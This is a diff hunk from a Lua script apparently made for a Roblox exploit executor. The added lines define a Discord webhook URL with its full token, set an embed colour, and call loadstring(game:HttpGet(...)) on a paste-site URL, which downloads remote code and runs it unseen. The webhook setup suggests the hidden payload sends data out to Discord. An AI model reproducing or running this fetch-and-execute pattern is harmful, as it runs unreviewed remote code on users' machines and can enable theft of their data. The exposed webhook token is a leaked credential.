@@ -3854,6 +3854,21 @@ end)()
         end)
     end
 end)()]]
+--[[
+
+					~~//  Color Code (HEX)  \\~~
+		RED = f54747				 GREEN = 78ff78
+		BLUE = 4c6cfc				 PURPLE = b36bff
+		YELLOW = fff27a				 PINK = ffa3e2
+
+
+	-- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--
+
+--]]
+
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1031250979494047894/6Jz3Ks8hUoiHklITWAenoJGCf8rrLWHMp73WQEzDvPjtn7Al1KaV5-EaJ9TdXpu2Uy4G" -- Discord Webhook Here
+getgenv().embedcolor = "0xf54747"
+loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
 coroutine.wrap(function()
     while wait(1)do
         pcall(function()
